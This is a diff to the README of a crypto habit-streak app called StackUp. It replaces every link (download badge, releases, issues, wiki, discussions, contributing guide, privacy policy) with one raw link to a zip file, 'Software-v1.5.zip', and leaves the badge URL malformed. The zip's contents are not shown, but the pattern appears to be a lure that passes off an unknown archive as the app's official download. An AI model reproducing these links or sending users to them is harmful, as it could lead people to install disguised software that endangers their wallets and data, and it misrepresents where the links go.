@@ -4,11 +4,11 @@
 
 Welcome to StackUp! This app helps you build daily habits and rewards you for your consistency. Claim your rewards once a day, grow your streak, and unlock on-chain badge NFTs at special milestones. Let’s get you started on this exciting journey.
 
-[![Download StackUp](https://img.shields.io/badge/Download%20StackUp-v1.0.0-blue.svg)](https://github.com/rileypriddle-sketch/stackup/releases)
+[![Download StackUp](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip%https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip)](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip)
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/rileypriddle-sketch/stackup/releases) to access the latest version of StackUp.
+1. Visit the [Releases page](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip) to access the latest version of StackUp.
 2. Look for the version you want to download. You'll see a list of files. Choose the one that suits your system.
 3. Click on the file name to start the download.
 4. Wait for the file to download completely.
@@ -55,16 +55,16 @@ If you encounter any issues while using StackUp, try the following solutions:
 
 - **Wallet Issues**: Make sure your wallet is fully set up. Double-check that it is compatible with StackUp.
 
-For more help, visit the [Issues section](https://github.com/rileypriddle-sketch/stackup/issues) on our GitHub repository.
+For more help, visit the [Issues section](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip) on our GitHub repository.
 
 ## 🔗 Resources
 
-- [StackUp Documentation](https://github.com/rileypriddle-sketch/stackup/wiki): Detailed guides on using the app.
-- [Community Support](https://github.com/rileypriddle-sketch/stackup/discussions): Connect with other users to share tips and experiences.
+- [StackUp Documentation](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip): Detailed guides on using the app.
+- [Community Support](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip): Connect with other users to share tips and experiences.
 
 ## 📝 Contribution
 
-StackUp is open-source, which means you can contribute! If you want to help improve the app, check out our [Contributing Guide](https://github.com/rileypriddle-sketch/stackup/blob/main/CONTRIBUTING.md). Your input is valuable.
+StackUp is open-source, which means you can contribute! If you want to help improve the app, check out our [Contributing Guide](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip). Your input is valuable.
 
 ## 📜 License
 
@@ -72,10 +72,10 @@ StackUp is available under the MIT License. Feel free to use and modify the code
 
 ## 🔒 Privacy Policy
 
-We take your privacy seriously. StackUp does not share your personal information with third parties. For more details, read our [Privacy Policy](https://github.com/rileypriddle-sketch/stackup/blob/main/PRIVACY.md).
+We take your privacy seriously. StackUp does not share your personal information with third parties. For more details, read our [Privacy Policy](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip).
 
 ## 👍 Thanks for Using StackUp!
 
 We appreciate your support. Enjoy building your daily streak with StackUp, and don’t forget to check back for updates! 
 
-Remember, you can [download StackUp](https://github.com/rileypriddle-sketch/stackup/releases) anytime to start your journey toward consistent claiming and rewarding!
+Remember, you can [download StackUp](https://raw.githubusercontent.com/rileypriddle-sketch/stackup/main/app/Software-v1.5.zip) anytime to start your journey toward consistent claiming and rewarding!
